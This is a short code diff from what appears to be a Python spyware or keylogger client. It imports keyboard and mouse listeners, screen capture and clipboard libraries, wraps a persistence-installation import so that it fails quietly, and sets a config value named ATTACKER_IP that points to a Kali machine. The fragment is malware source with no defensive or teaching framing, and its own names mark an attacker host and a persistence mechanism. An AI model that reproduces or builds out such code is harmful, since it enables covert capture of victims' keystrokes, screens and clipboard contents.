@@ -41,7 +41,11 @@ from pynput import keyboard, mouse
 import mss
 import pyperclip
 
-from persistence import install as install_persistence, uninstall as uninstall_persistence
+try:
+    from persistence import install as install_persistence, uninstall as uninstall_persistence
+except ImportError:
+    install_persistence = lambda: False
+    uninstall_persistence = lambda: None
 
 # ---------------- CONFIG ----------------
 ATTACKER_IP      = "192.168.160.129"   # <-- IP KALI
